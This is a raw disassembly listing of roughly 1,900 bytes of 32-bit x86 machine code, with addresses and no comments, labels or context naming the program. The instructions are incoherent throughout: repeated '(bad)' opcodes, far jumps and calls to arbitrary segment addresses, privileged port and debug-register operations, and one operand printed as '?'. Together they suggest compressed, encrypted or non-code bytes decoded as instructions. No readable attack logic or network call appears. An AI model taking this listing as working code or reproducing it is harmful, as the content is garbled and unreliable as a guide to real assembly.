  43e05b:	adc    edx,DWORD PTR [esi-0x59]
  43e05e:	aam    0x40
  43e060:	dec    ebp
  43e061:	jle    0x43dff5
  43e063:	push   esi
  43e064:	ror    BYTE PTR [edx+0x4a81ca1e],1
  43e06a:	pop    esi
  43e06b:	and    al,0x1e
  43e06d:	sbb    ch,0xc0
  43e070:	mov    WORD PTR es:[edx],cs
  43e073:	outs   dx,DWORD PTR ds:[esi]
  43e074:	push   0xc8041b00
  43e079:	and    BYTE PTR [edi+edx*8+0x58],cl
  43e07d:	push   esp
  43e07e:	jmp    0x43e0f8
  43e080:	add    ah,dl
  43e082:	dec    eax
  43e083:	test   BYTE PTR [edi],0xc4
  43e086:	test   eax,0xea29c82e
  43e08b:	stos   BYTE PTR es:[edi],al
  43e08c:	int    0x84
  43e08e:	inc    edx
  43e08f:	inc    ebp
  43e090:	pusha  
  43e091:	pusha  
  43e092:	add    bh,BYTE PTR [esi]
  43e094:	inc    eax
  43e095:	sub    eax,DWORD PTR [edi+ebp*1]
  43e098:	or     al,0x64
  43e09a:	inc    eax
  43e09b:	cld    
  43e09c:	cli    
  43e09d:	sbb    eax,0xd0bad0e7
  43e0a2:	daa    
  43e0a3:	xor    BYTE PTR [edi],ch
  43e0a5:	jmp    0x7444:0xaf19469a
  43e0ac:	push   es
  43e0ad:	nop
  43e0ae:	(bad)  
  43e0af:	dec    edx
  43e0b0:	and    al,0x82
  43e0b2:	dec    edi
  43e0b3:	(bad)  
  43e0b4:	outs   dx,DWORD PTR ds:[esi]
  43e0b5:	adc    al,0x44
  43e0b7:	arpl   WORD PTR [edi+ebp*2],di
  43e0ba:	mov    ecx,0x740c337e
  43e0bf:	adc    dh,BYTE PTR [ecx+esi*2]
  43e0c2:	or     al,0x18
  43e0c4:	add    al,0x5e
  43e0c6:	loope  0x43e08e
  43e0c8:	add    edi,DWORD PTR [esi-0x29f93b6]
  43e0ce:	mov    ah,0xf0
  43e0d0:	pop    esp
  43e0d1:	xchg   ebp,eax
  43e0d2:	mov    ah,0xd2
  43e0d4:	jno    0x43e102
  43e0d6:	add    al,0x3a
  43e0d8:	ror    DWORD PTR [esi+0x2f2ef0b8],1
  43e0de:	mov    esp,0xa1b5e13b
  43e0e3:	xlat   BYTE PTR ds:[ebx]
  43e0e4:	cwde   
  43e0e5:	push   ecx
  43e0e6:	pop    ebx
  43e0e7:	in     al,0x42
  43e0e9:	xchg   esi,eax
  43e0ea:	loop   0x43e06f
  43e0ec:	add    al,0x1e
  43e0ee:	cmp    al,0x5f
  43e0f0:	xlat   BYTE PTR ds:[ebx]
  43e0f1:	mov    bl,BYTE PTR [edx+eiz*8-0x79]
  43e0f5:	ror    DWORD PTR [eax+0x44],1
  43e0f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e0f9:	dec    edx
  43e0fa:	mov    eax,ds:0xf6a5085d
  43e0ff:	dec    ecx
  43e100:	scas   al,BYTE PTR es:[edi]
  43e101:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e102:	sar    BYTE PTR [edx-0x66],1
  43e105:	in     eax,dx
  43e106:	push   ebx
  43e107:	add    BYTE PTR [esi+0x70],dl
  43e10a:	ror    al,cl
  43e10c:	hlt    
  43e10d:	push   0xffffffdc
  43e10f:	mov    eax,0x8011c4d0
  43e114:	push   eax
  43e115:	enter  0xf699,0x1
  43e119:	bound  edx,QWORD PTR [ebp-0x6416ff50]
  43e11f:	cli    
  43e120:	sub    eax,DWORD PTR [edx-0x75066575]
  43e126:	cmp    eax,DWORD PTR [edx+0x7c008c9e]
  43e12c:	hlt    
  43e12d:	push   0xfffffff9
  43e12f:	and    ch,0x19
  43e132:	sbb    BYTE PTR [ebx+eiz*2-0x33ad07a8],al
  43e139:	xlat   BYTE PTR ds:[ebx]
  43e13a:	push   ss
  43e13b:	jbe    0x43e1b2
  43e13d:	sub    dh,BYTE PTR [edx+0x5a921d26]
  43e143:	adc    eax,0x81247c65
  43e148:	es pushf 
  43e14a:	aam    0xbb
  43e14c:	inc    esi
  43e14d:	enter  0x7b36,0x68
  43e151:	adc    BYTE PTR [ecx+0x76],al
  43e154:	mov    fs,WORD PTR [edi]
  43e156:	aas    
  43e157:	pop    eax
  43e158:	les    ecx,FWORD PTR [ebx+0x3f]
  43e15b:	or     DWORD PTR [ebp-0x66],ebp
  43e15e:	or     DWORD PTR [eax+0x76],ecx
  43e161:	lods   al,BYTE PTR ds:[esi]
  43e162:	or     BYTE PTR [ebx],dh
  43e164:	aad    0xd
  43e166:	sbb    eax,0x7622a172
  43e16b:	hlt    
  43e16c:	or     BYTE PTR [ebp+0x24],al
  43e16f:	fiadd  DWORD PTR [esi]
  43e171:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e172:	fdivr  QWORD PTR [esi+0x600f120]
  43e178:	pop    esi
  43e179:	adc    al,0x52
  43e17b:	xchg   edi,eax
  43e17c:	sbb    al,0xf4
  43e17e:	xor    al,0xd4
  43e180:	outs   dx,DWORD PTR ds:[esi]
  43e181:	jmp    0x26405a0b
  43e186:	dec    esi
  43e187:	mov    al,ds:0xe34855df
  43e18c:	mov    bh,BYTE PTR [edx]
  43e18e:	in     eax,dx
  43e18f:	or     BYTE PTR [ecx+0x2714068],ah
  43e195:	cmp    dl,BYTE PTR [eax+0x3]
  43e198:	push   eax
  43e199:	test   ecx,esi
  43e19b:	jmp    0x809f:0x48709c6c
  43e1a2:	neg    BYTE PTR [edx]
  43e1a4:	fwait
  43e1a5:	cmp    BYTE PTR [esi],dl
  43e1a7:	jmp    0x1536:0xc3b13772
  43e1ae:	jl     0x43e1ec
  43e1b0:	rcl    DWORD PTR [edx],cl
  43e1b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e1b3:	pop    eax
  43e1b4:	int3   
  43e1b5:	jae    0x43e209
  43e1b7:	sbb    BYTE PTR [edx],bh
  43e1b9:	and    dh,BYTE PTR [ebp-0x210cc264]
  43e1bf:	cli    
  43e1c0:	icebp  
  43e1c1:	fs push 0x2b8a2887
  43e1c7:	sub    edi,esp
  43e1c9:	jnp    0x43e155
  43e1cb:	test   al,0x2e
  43e1cd:	mov    bl,0x40
  43e1cf:	je     0x43e1e9
  43e1d1:	dec    esp
  43e1d2:	lock or ch,ch
  43e1d5:	adc    ecx,edx
  43e1d7:	jl     0x43e1d8
  43e1d9:	stos   BYTE PTR es:[edi],al
  43e1da:	pushf  
  43e1db:	cdq    
  43e1dc:	(bad)  
  43e1dd:	lds    ebx,FWORD PTR [eax-0x49dc7540]
  43e1e3:	lahf   
  43e1e4:	push   0x10
  43e1e6:	nop
  43e1e7:	add    eax,0x867e221f
  43e1ec:	ret    0xf63a
  43e1ef:	cmp    DWORD PTR [eax+0x58],ecx
  43e1f2:	out    0x45,al
  43e1f4:	es dec ecx
  43e1f6:	xchg   esp,eax
  43e1f7:	je     0x43e25d
  43e1f9:	jae    0x43e1fb
  43e1fb:	fwait
  43e1fc:	jmp    0xf24:0xdd82d61b
  43e203:	mov    bl,0xce
  43e205:	aam    0x46
  43e207:	dec    edx
  43e208:	(bad)  
  43e209:	or     eax,0xe05ebbf6
  43e20e:	(bad)
  43e212:	test   al,0xe7
  43e214:	mov    WORD PTR [ebp+eax*1+0x6e],?
  43e218:	jecxz  0x43e283
  43e21a:	add    al,al
  43e21c:	push   ds
  43e21d:	adc    al,BYTE PTR [edx+0x74a05811]
  43e223:	ds fwait
  43e225:	jp     0x43e1b4
  43e227:	jne    0x43e1e5
  43e229:	push   0xa6913eb5
  43e22e:	dec    edi
  43e22f:	call   0x4bb4b7eb
  43e234:	cs dec esi
  43e236:	test   esi,esp
  43e238:	cs inc ebx
  43e23a:	(bad)  
  43e23b:	shr    BYTE PTR [eax],1
  43e23d:	mov    eax,ds:0xe04652ee
  43e242:	xchg   ebp,eax
  43e243:	add    BYTE PTR [esp+ebp*4-0x66],ch
  43e247:	scas   eax,DWORD PTR es:[edi]
  43e248:	mov    edx,0x2a5b09c9
  43e24d:	js     0x43e28f
  43e24f:	add    BYTE PTR [edx-0x7a],0xa4
  43e253:	mov    al,ds:0x1c650a36
  43e258:	call   0xd8b06cdf
  43e25d:	mov    esi,0xa38abd00
  43e262:	mov    eax,DWORD PTR [edi+edi*1]
  43e265:	push   edx
  43e266:	adc    al,BYTE PTR ds:0x18e0a0ad
  43e26c:	jp     0x43e2d3
  43e26e:	ror    ah,0x30
  43e271:	push   esi
  43e272:	push   ss
  43e273:	cmp    esi,DWORD PTR [esi]
  43e275:	adc    eax,0xacd85a02
  43e27a:	inc    edx
  43e27b:	xor    BYTE PTR [edx-0x7de04ca5],cl
  43e281:	retf   0x922a
  43e284:	sbb    al,0x22
  43e286:	data16 jbe 0x43e2a0
  43e289:	std    
  43e28a:	pop    ss
  43e28b:	xor    al,0x1e
  43e28d:	dec    ecx
  43e28e:	inc    esp
  43e28f:	mov    ecx,0x2a532c5
  43e294:	in     eax,dx
  43e295:	adc    ebp,DWORD PTR [eax+0x239bb860]
  43e29b:	or     bh,BYTE PTR [eax+0x2fc2d3fe]
  43e2a1:	test   WORD PTR [esp+eiz*8],ax
  43e2a5:	nop
  43e2a6:	push   esi
  43e2a7:	add    BYTE PTR [eax+0xd490a89],cl
  43e2ad:	(bad)  
  43e2ae:	call   0xe60634c4
  43e2b3:	cs xchg ecx,eax
  43e2b5:	fcomp  DWORD PTR [edx-0x4d]
  43e2b8:	push   edi
  43e2b9:	hlt    
  43e2ba:	retf   0x82b9
  43e2bd:	aad    0x6a
  43e2bf:	lods   al,BYTE PTR ds:[esi]
  43e2c0:	mov    ebx,0x7e82f82b
  43e2c5:	loop   0x43e2bf
  43e2c7:	inc    esi
  43e2c8:	pusha  
  43e2c9:	test   al,0x0
  43e2cb:	dec    esi
  43e2cc:	inc    eax
  43e2cd:	mov    cl,0x1a
  43e2cf:	arpl   WORD PTR [ebx+0x63],sp
  43e2d2:	or     esp,ebp
  43e2d4:	mov    esp,0x55626b9
  43e2d9:	mov    al,ds:0xa64e5ab5
  43e2de:	jp     0x43e30d
  43e2e0:	test   al,0x4a
  43e2e2:	add    al,0x2c
  43e2e4:	cmp    BYTE PTR [eax+esi*2],cl
  43e2e7:	push   edi
  43e2e8:	adc    al,0x1e
  43e2ea:	add    ah,ah
  43e2ec:	push   ss
  43e2ed:	push   esp
  43e2ee:	dec    eax
  43e2ef:	sub    DWORD PTR [eax-0x15],esp
  43e2f2:	and    DWORD PTR [ecx+0x63833228],eax
  43e2f8:	xchg   edx,eax
  43e2f9:	popa   
  43e2fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e2fb:	cmc    
  43e2fc:	fs push eax
  43e2fe:	loopne 0x43e2f4
  43e300:	and    al,0xba
  43e302:	popa   
  43e303:	push   ds
  43e304:	mov    BYTE PTR [eax+edx*8],ah
  43e307:	xor    bh,BYTE PTR [ebx+ebx*8]
  43e30a:	js     0x43e28c
  43e30c:	cld    
  43e30d:	ficomp DWORD PTR [eax+0x386a507a]
  43e313:	push   es
  43e314:	gs dec esi
  43e316:	mov    edx,0x734a8ca3
  43e31b:	adc    BYTE PTR [eax-0x18],ch
  43e31e:	mov    esp,0xb247c2eb
  43e323:	adc    BYTE PTR [ebx+edi*8+0x1],0x62
  43e328:	jno    0x43e320
  43e32a:	call   0xb3e1:0x43a680ef
  43e331:	hlt    
  43e332:	mov    DWORD PTR [edx-0x7f],ecx
  43e335:	into   
  43e336:	sbb    bh,BYTE PTR [ebx-0x3e4e6f2f]
  43e33c:	mov    esp,0x4d00fbb6
  43e341:	sbb    eax,0xfa1be55c
  43e346:	push   0xffb63da1
  43e34b:	cmp    bl,ah
  43e34d:	lods   al,BYTE PTR ds:[esi]
  43e34e:	cmp    BYTE PTR [ebx+0x1a],ch
  43e351:	mov    ah,0xc0
  43e353:	push   ds
  43e354:	mov    dl,BYTE PTR [edx]
  43e356:	sbb    eax,0x59124018
  43e35b:	pop    ebp
  43e35c:	sub    BYTE PTR [eax-0x44],dl
  43e35f:	xchg   dh,cl
  43e361:	pop    esi
  43e362:	popf   
  43e363:	inc    eax
  43e364:	shl    ah,cl
  43e366:	inc    edx
  43e367:	xchg   edi,eax
  43e368:	mov    BYTE PTR [ebx+0x50887528],ch
  43e36e:	out    dx,al
  43e36f:	mov    ah,0xc0
  43e371:	pop    esi
  43e372:	add    DWORD PTR [eax-0x27],esp
  43e375:	or     BYTE PTR [esp+ecx*8+0x5b64a53b],ch
  43e37c:	shl    DWORD PTR [edi],1
  43e37e:	fadd   QWORD PTR [eax+eiz*1]
  43e381:	idiv   DWORD PTR [eax-0x5be3ce97]
  43e387:	ror    DWORD PTR [ecx],1
  43e389:	sub    DWORD PTR [esi+0x557ce858],0x4f203d81
  43e393:	and    ecx,DWORD PTR [esi]
  43e395:	int3   
  43e396:	scas   eax,DWORD PTR es:[edi]
  43e397:	jle    0x43e325
  43e399:	fild   WORD PTR [eax]
  43e39b:	mov    dh,0xb8
  43e39d:	xor    dh,BYTE PTR [ecx-0x6e]
  43e3a0:	aad    0xdd
  43e3a2:	xchg   BYTE PTR ds:0x90edb9ad,al
  43e3a8:	fmul   QWORD PTR [eax+edx*8]
  43e3ab:	push   ecx
  43e3ac:	add    BYTE PTR [ecx],ah
  43e3ae:	jnp    0x43e3a4
  43e3b0:	sar    DWORD PTR [eax-0x8],1
  43e3b3:	pop    ebx
  43e3b4:	add    esp,DWORD PTR [ecx+0x6b]
  43e3b7:	fs jp  0x43e33c
  43e3ba:	mov    BYTE PTR [ecx+0x39b005f4],bh
  43e3c0:	push   esi
  43e3c1:	bound  eax,QWORD PTR [eax+ebp*4-0x7578a76a]
  43e3c8:	fsubr  DWORD PTR [eax+0x36]
  43e3cb:	test   dl,al
  43e3cd:	push   edi
  43e3ce:	add    bh,BYTE PTR [eax+0x4bd8344c]
  43e3d4:	inc    eax
  43e3d5:	clc    
  43e3d6:	inc    ecx
  43e3d7:	mov    ebp,DWORD PTR [edx-0xe]
  43e3da:	call   0x32fa:0x4888344d
  43e3e1:	xchg   BYTE PTR [ecx],cl
  43e3e3:	int    0x6c
  43e3e5:	mov    ah,bl
  43e3e7:	rcl    BYTE PTR [ecx+ecx*2+0x4e480255],1
  43e3ee:	xor    BYTE PTR [esi-0x28],0x78
  43e3f2:	int    0x96
  43e3f4:	push   eax
  43e3f5:	push   0xffffffa0
  43e3f7:	pop    esp
  43e3f8:	push   0xffffffae
  43e3fa:	xor    eax,0x1963a521
  43e3ff:	bound  ebx,QWORD PTR [edi]
  43e401:	jmp    0xd496:0x54c1f194
  43e408:	in     al,0xe8
  43e40a:	sbb    DWORD PTR [edi],ebx
  43e40c:	popa   
  43e40d:	cld    
  43e40e:	ins    BYTE PTR es:[edi],dx
  43e40f:	call   0x3b4d08a3
  43e414:	lods   eax,DWORD PTR ds:[esi]
  43e415:	mov    ds:0xcdb65da8,al
  43e41a:	cmp    bh,BYTE PTR [edx+0x54e2716e]
  43e420:	out    dx,al
  43e421:	fisubr WORD PTR [edx]
  43e423:	push   ds
  43e424:	and    eax,0x37d2706d
  43e429:	mov    ah,0x8f
  43e42b:	call   0xda8b:0x143ad808
  43e432:	mov    edi,0x706cdc88
  43e437:	cli    
  43e438:	xchg   ecx,eax
  43e439:	int3   
  43e43a:	nop
  43e43b:	xor    esi,0x2a88eac2
  43e441:	pop    esi
  43e442:	add    DWORD PTR [ecx],0x15
  43e445:	mov    al,ds:0x901c36fd
  43e44a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e44b:	pop    es
  43e44c:	mov    BYTE PTR [esi-0x6174b5d1],ah
  43e452:	mov    ss,WORD PTR [ecx-0x2f373eec]
  43e458:	pop    ds
  43e459:	push   esp
  43e45a:	mov    cl,0x80
  43e45c:	push   esi
  43e45d:	ds adc esi,edx
  43e460:	stos   BYTE PTR es:[edi],al
  43e461:	loopne 0x43e470
  43e463:	mov    ch,0x5
  43e465:	adc    bl,BYTE PTR [esi]
  43e467:	(bad)  
  43e468:	hlt    
  43e469:	leave  
  43e46a:	and    al,BYTE PTR ds:0xfa66c4df
  43e470:	push   edi
  43e471:	jmp    0x43e463
  43e473:	fld    DWORD PTR [edx-0x10]
  43e476:	add    ch,ch
  43e478:	mov    bl,0xad
  43e47a:	xchg   BYTE PTR [esi],ch
  43e47c:	xor    cl,bh
  43e47e:	and    ch,0x2
  43e481:	mov    al,BYTE PTR [edi+eax*1-0x49abefb8]
  43e488:	push   eax
  43e489:	es loop 0x43e425
  43e48c:	jle    0x43e428
  43e48e:	pop    esi
  43e48f:	cli    
  43e490:	dec    ecx
  43e491:	push   0xf1ca0273
  43e496:	out    dx,al
  43e497:	mov    ss,WORD PTR [ebp+0x2a]
  43e49a:	mov    tr6,eax
  43e49d:	shl    DWORD PTR [esi],cl
  43e49f:	rol    BYTE PTR [esi+0x22],0x7e
  43e4a3:	or     DWORD PTR [ecx-0x42f3edf6],0xffffffae
  43e4aa:	adc    eax,0xcce32788
  43e4af:	adc    ecx,DWORD PTR [ebx+edx*2]
  43e4b2:	mov    ss,esp
  43e4b4:	fwait
  43e4b5:	rol    BYTE PTR [edx],cl
  43e4b7:	scas   al,BYTE PTR es:[edi]
  43e4b8:	cmp    DWORD PTR [ebx+0x2c],edx
  43e4bb:	fs sub al,0x34
  43e4be:	mov    eax,ds:0x83706808
  43e4c3:	clc    
  43e4c4:	inc    eax
  43e4c5:	add    cl,BYTE PTR [edi+0x38b735d0]
  43e4cb:	jmp    DWORD PTR [ecx+0x11238508]
  43e4d1:	adc    dh,dh
  43e4d3:	jp     0x43e542
  43e4d5:	cmp    al,0x84
  43e4d7:	jbe    0x43e499
  43e4d9:	jp     0x43e4eb
  43e4db:	xchg   edx,eax
  43e4dc:	je     0x43e4da
  43e4de:	mov    DWORD PTR [edx+0x48],ebx
  43e4e1:	arpl   WORD PTR [edx],bp
  43e4e3:	xchg   BYTE PTR [ecx+0x2a0d6c0a],dh
  43e4e9:	loop   0x43e509
  43e4eb:	add    esi,0x98dca9c8
  43e4f1:	cmp    BYTE PTR [ebx-0x67bb8521],dh
  43e4f7:	and    bh,cl
  43e4f9:	mov    ds:0xf4286dba,al
  43e4fe:	adc    bl,dl
  43e500:	sub    esp,DWORD PTR [eax-0x42]
  43e503:	mov    WORD PTR [esi],cs
  43e505:	into   
  43e506:	leave  
  43e507:	push   edx
  43e508:	xlat   BYTE PTR ds:[ebx]
  43e509:	ins    BYTE PTR es:[edi],dx
  43e50a:	jo     0x43e526
  43e50c:	xchg   edi,eax
  43e50d:	mov    ds:0x1381ecd,al
  43e512:	fcomp  DWORD PTR [eax+0x64]
  43e515:	clc    
  43e516:	inc    ebp
  43e517:	in     al,dx
  43e518:	out    dx,al
  43e519:	jle    0x43e56b
  43e51b:	xor    dl,BYTE PTR [ebp-0x78]
  43e51e:	push   ds
  43e51f:	aam    0xb
  43e521:	adc    eax,esp
  43e523:	jns    0x43e594
  43e525:	adc    al,0x81
  43e527:	adc    eax,0xb9a6009d
  43e52c:	add    al,0x63
  43e52e:	jge    0x43e550
  43e530:	mov    eax,ds:0x8e4e82fd
  43e535:	addr16 add al,0x84
  43e538:	sahf   
  43e539:	push   esp
  43e53a:	mov    ds:0xfe29c6f1,eax
  43e53f:	inc    esi
  43e540:	dec    eax
  43e541:	addr16 push 0x985882ab
  43e547:	xor    al,0x49
  43e549:	enter  0xfa8,0xd6
  43e54d:	inc    edx
  43e54e:	sbb    bl,BYTE PTR [edx]
  43e550:	iret   
  43e551:	jae    0x43e50d
  43e553:	lods   eax,DWORD PTR ds:[esi]
  43e554:	fwait
  43e555:	or     DWORD PTR cs:[ebp+0x4],ebp
  43e559:	mov    ebp,0xf49d0ee2
  43e55e:	jb     0x43e52e
  43e560:	or     BYTE PTR [esi],bh
  43e562:	xchg   edx,eax
  43e563:	push   0x4ba4dd34
  43e568:	icebp  
  43e569:	test   al,0x97
  43e56b:	inc    esp
  43e56c:	daa    
  43e56d:	add    eax,0xf6fef0fe
  43e572:	(bad)  
  43e573:	push   0xf
  43e575:	mov    BYTE PTR [esi+edi*2+0x48],dl
  43e579:	sub    DWORD PTR [edx],ecx
  43e57b:	aad    0x36
  43e57d:	popa   
  43e57e:	lods   al,BYTE PTR ds:[esi]
  43e57f:	cmp    BYTE PTR [edx],ah
  43e581:	xor    BYTE PTR [eax-0x2e29b51e],0xb6
  43e588:	add    BYTE PTR [ebx],bh
  43e58a:	mov    esi,0x9617e241
  43e58f:	and    BYTE PTR [ecx+0x28],al
  43e592:	mov    ds:0x71a60070,al
  43e597:	mov    dh,0x2d
  43e599:	add    DWORD PTR [ebp+0x5eb4eb2a],0x8088aa6
  43e5a3:	fist   WORD PTR [eax+0xa815a8a]
  43e5a9:	pop    ss
  43e5aa:	mov    esp,0xd09a099
  43e5af:	adc    eax,0x6a2e1922
  43e5b4:	imul   ebx,edx,0xffffffa6
  43e5b7:	sub    eax,esp
  43e5b9:	xchg   ecx,eax
  43e5ba:	lods   eax,DWORD PTR ds:[esi]
  43e5bb:	test   al,0xfa
  43e5bd:	cmc    
  43e5be:	cmc    
  43e5bf:	std    
  43e5c0:	sub    BYTE PTR [edx-0x1b8f6b8c],0xb3
  43e5c7:	pop    esi
  43e5c8:	mov    dh,0x1b
  43e5ca:	add    esp,DWORD PTR [ebx]
  43e5cc:	arpl   WORD PTR [ecx+0x4985d858],ax
  43e5d2:	fcom   QWORD PTR [edi+0x6]
  43e5d5:	push   esi
  43e5d6:	adc    al,0x86
  43e5d8:	sar    BYTE PTR [eax-0x491b816e],0x64
  43e5df:	popf   
  43e5e0:	add    DWORD PTR [eax+esi*2-0x66],ebp
  43e5e4:	aas    
  43e5e5:	or     BYTE PTR [esi],dl
  43e5e7:	icebp  
  43e5e8:	push   edx
  43e5e9:	sub    esp,DWORD PTR [esi]
  43e5eb:	xlat   BYTE PTR ds:[ebx]
  43e5ec:	xchg   esp,eax
  43e5ed:	clc    
  43e5ee:	mov    cl,bh
  43e5f0:	fdivr  DWORD PTR [esi]
  43e5f2:	ins    BYTE PTR es:[edi],dx
  43e5f3:	std    
  43e5f4:	sub    cl,BYTE PTR [ebx+ebp*4]
  43e5f7:	sbb    al,BYTE PTR [ebp-0x48]
  43e5fa:	(bad)  
  43e5fb:	pushf  
  43e5fc:	or     DWORD PTR [edi+0x51ccd0f5],ecx
  43e602:	ds and al,0x2f
  43e605:	cs xor eax,0xfa5e22fd
  43e60b:	je     0x43e66f
  43e60d:	into   
  43e60e:	lods   al,BYTE PTR ds:[esi]
  43e60f:	xchg   ecx,eax
  43e610:	or     ah,BYTE PTR [ecx-0x47f68d93]
  43e616:	and    bh,BYTE PTR [ebx+0x0]
  43e619:	jae    0x43e631
  43e61b:	pop    eax
  43e61c:	clc    
  43e61d:	lahf   
  43e61e:	test   BYTE PTR [esi-0x7d],bh
  43e621:	pop    edx
  43e622:	lock fdiv DWORD PTR [esi]
  43e625:	pop    esi
  43e626:	rcl    dh,1
  43e628:	sbb    dh,BYTE PTR [esp+eax*8+0x6e]
  43e62c:	mov    al,ss:0xefc9948f
  43e632:	dec    esp
  43e633:	pushf  
  43e634:	popa   
  43e635:	mov    esp,0x6853421c
  43e63a:	icebp  
  43e63b:	inc    ecx
  43e63c:	pop    edx
  43e63d:	aad    0x48
  43e63f:	pop    es
  43e640:	pushf  
  43e641:	stos   DWORD PTR es:[edi],eax
  43e642:	loop   0x43e670
  43e644:	and    DWORD PTR [edi],edi
  43e646:	inc    edx
  43e647:	mov    edi,0x919b6c09
  43e64c:	retf   
  43e64d:	cmp    al,0xea
  43e650:	mov    eax,ds:0xd63d24c2
  43e655:	jle    0x43e651
  43e657:	fcomp  QWORD PTR [ebp-0x5fd3b55f]
  43e65d:	sub    al,0x48
  43e65f:	idiv   BYTE PTR es:[ebp-0x42]
  43e663:	imul   ebp,ebp,0x1120bf05
  43e669:	inc    edx
  43e66a:	fild   DWORD PTR [esi+0xebb14d6]
  43e670:	push   ecx
  43e671:	adc    eax,0xe85a5e70
  43e676:	push   edx
  43e677:	xchg   dl,bh
  43e679:	push   esi
  43e67a:	add    ecx,DWORD PTR [esp+esi*4+0x5ec0a314]
  43e681:	pop    es
  43e682:	arpl   WORD PTR [ebp+0x6cde3ed3],dx
  43e688:	scas   eax,DWORD PTR es:[edi]
  43e689:	(bad)  
  43e68a:	call   0xacb8:0x78d85461
  43e691:	loop   0x43e66d
  43e693:	mov    esp,0xc8e0aa6b
  43e698:	add    al,0xa0
  43e69a:	aas    
  43e69b:	lock mov edx,0xa9b60d6a
  43e6a1:	xchg   esi,eax
  43e6a2:	les    ecx,FWORD PTR [eax+edx*4-0x5f]
  43e6a6:	adc    BYTE PTR [eax+ebp*2+0x4b320158],bh
  43e6ad:	adc    dl,BYTE PTR [ebx]
  43e6af:	and    BYTE PTR ss:[esi],ah
  43e6b2:	call   0xca14:0x9778aa59
  43e6b9:	ins    BYTE PTR es:[edi],dx
  43e6ba:	adc    DWORD PTR ds:[eax+0x15],ebp
  43e6be:	or     BYTE PTR [esi-0x2a],bh
  43e6c1:	mov    bl,0xe6
  43e6c3:	stc    
  43e6c4:	cmp    BYTE PTR [edx],dl
  43e6c6:	pop    ebp
  43e6c7:	(bad)  
  43e6c9:	aam    0xb4
  43e6cb:	stos   BYTE PTR es:[edi],al
  43e6cc:	leave  
  43e6cd:	sbb    edi,0xc21fd6d6
  43e6d3:	pop    eax
  43e6d4:	push   eax
  43e6d5:	mov    ecx,0x1ef6fb94
  43e6da:	mov    esp,es
  43e6dc:	xor    eax,0xe6721008
  43e6e1:	sbb    cl,BYTE PTR [ebp-0x2a]
  43e6e4:	add    eax,0xf494becb
  43e6e9:	call   0x98313228
  43e6ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e6ef:	sbb    eax,0xc6780eae
  43e6f4:	jg     0x43e6a1
  43e6f6:	les    ecx,FWORD PTR [ecx+0x59]
  43e6f9:	and    BYTE PTR [ebx],0x41
  43e6fc:	ins    BYTE PTR es:[edi],dx
  43e6fd:	adc    al,0xee
  43e6ff:	xchg   ecx,eax
  43e700:	retf   0x7b0a
  43e703:	sub    BYTE PTR [eax-0x2ea69141],ch
  43e709:	mov    eax,0x4bf6a122
  43e70e:	rcl    BYTE PTR [ebx+0x4384d0b7],0x40
  43e715:	add    DWORD PTR ds:0xbc11e0a6,0xfffffff4
  43e71c:	xor    esi,esi
  43e71e:	cmp    al,0x1e
  43e720:	jbe    0x43e6ba
  43e722:	mov    gs,WORD PTR [edx+0x12]
  43e725:	or     al,0x1b
  43e727:	pusha  
  43e728:	sub    DWORD PTR [ecx+0x55],ecx
  43e72b:	test   al,0x61
  43e72d:	jo     0x43e745
  43e72f:	sahf   
  43e730:	push   ecx
  43e731:	dec    eax
  43e732:	test   eax,0xa93ca2c0
  43e737:	push   es
  43e738:	repnz scas al,BYTE PTR es:[edi]
  43e73a:	dec    esp
  43e73b:	mov    esp,0x7d304a22
  43e740:	shl    BYTE PTR [esi],1
  43e742:	sbb    bl,BYTE PTR [ebx+0x46a082dc]
  43e748:	icebp  
  43e749:	and    ch,ch
  43e74b:	sbb    al,dl
  43e74d:	addr16 add ax,0xbae9
  43e752:	add    ebx,DWORD PTR [edx+0x228130b9]
  43e758:	sbb    edi,DWORD PTR [eax]
  43e75a:	adc    eax,0xbd744c62
  43e75f:	mov    ds:0x81800e35,al
  43e764:	pop    edx
  43e765:	jle    0x43e769
  43e767:	fmul   DWORD PTR [ebp+0x74]
  43e76a:	jmp    0xa801:0xe03d6434
  43e771:	(bad)  
  43e772:	adc    ch,al
  43e774:	fstp   st(7)
  43e776:	nop
  43e777:	shl    BYTE PTR [esi+0x65],cl
  43e77a:	jmp    0x14fcad4e
  43e77f:	mov    eax,0x8301ec63
  43e784:	loope  0x43e7d9
  43e786:	mov    dl,0x53
  43e788:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e78a:	and    BYTE PTR [esi-0x1f6dfa2c],0x62
  43e791:	pop    esi
  43e792:	out    dx,eax
  43e793:	push   es
  43e794:	adc    edi,ecx
  43e796:	push   es
  43e797:	mov    dh,0x57
  43e799:	inc    eax
  43e79a:	xchg   esi,eax
  43e79b:	out    dx,al
  43e79c:	and    dh,bh
  43e79e:	jecxz  0x43e753
  43e7a0:	add    al,0x14
  43e7a2:	mov    dh,0x90
  43e7a4:	push   0x26
  43e7a6:	add    al,BYTE PTR [eax+0x21]
  43e7a9:	mov    WORD PTR [edi],cs
  43e7ab:	out    0x94,al
  43e7ad:	fdiv   QWORD PTR [ecx+0x42]
  43e7b0:	mov    ah,0x3d
  43e7b2:	ror    DWORD PTR [edx+0x69],0x52
  43e7b6:	jmp    0xa4042cba
  43e7bb:	mov    WORD PTR [esi-0x16],es
  43e7be:	pop    edi
  43e7bf:	adc    al,0xe9
  43e7c1:	push   eax
  43e7c2:	gs sbb edx,esp
  43e7c5:	jb     0x43e80b
  43e7c7:	lahf   
  43e7c8:	mov    bh,0x34
  43e7ca:	pushf  
  43e7cb:	shl    BYTE PTR [edx-0x19d95e2c],cl
  43e7d1:	adc    cl,BYTE PTR [ebp-0x15a61492]
  43e7d7:	mov    eax,0x6484d42a
  43e7dc:	retf   
  43e7dd:	push   0x30
  43e7df:	or     ecx,esp
  43e7e1:	jp     0x43e851
  43e7e3:	daa    
  43e7e4:	or     DWORD PTR [ebp+0x72],edx
  43e7e7:	or     cl,BYTE PTR [eax-0x5c]
  43e7ea:	mov    dh,0x83
  43e7ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e7ed:	(bad)  
  43e7ef:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
